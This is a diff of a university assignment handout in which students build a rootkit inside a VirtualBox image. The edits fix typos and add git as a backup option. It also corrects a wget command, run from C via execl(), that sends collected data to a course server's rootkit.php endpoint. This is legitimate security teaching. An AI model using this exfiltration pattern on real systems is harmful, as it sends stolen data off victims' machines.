@@ -26,12 +26,13 @@ some fashion before you attempt to run it EACH TIME you are running
 something that could negatively affect the system.  A few options
 exist for that:
 
-- Email it to your self
+- Email it to yourself
 - Set up [VirtualBox shared
   folders](https://help.ubuntu.com/community/VirtualBox/SharedFolders)
   and save it there -- we recommend this option, since you won't have
   to reconfigure it each time you wipe your VirtualBox image (you can
   just run the code from that folder)
+- Use git
 - Install Dropbox
 
 Once you have backed up your code for this assignment, if you brick
@@ -308,7 +309,7 @@ where mst3k is your userid and the `...` is the data you are sending.
 You can do this via a `wget` call (again, executing a command-line
 program from the C/C++ program via
 [execl()](https://www.systutorials.com/docs/linux/man/3-exec/)): `wget
-https//libra.cs.virginia.edu/rootkit.php?userid=mst3k&data=...`.  This
+https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&data=...`.  This
 puts the information into the apache web server log.  There are more
 efficient ways to do this, but putting it into the apache log is fine
 for this assignment.  Note that you should supress the output from the
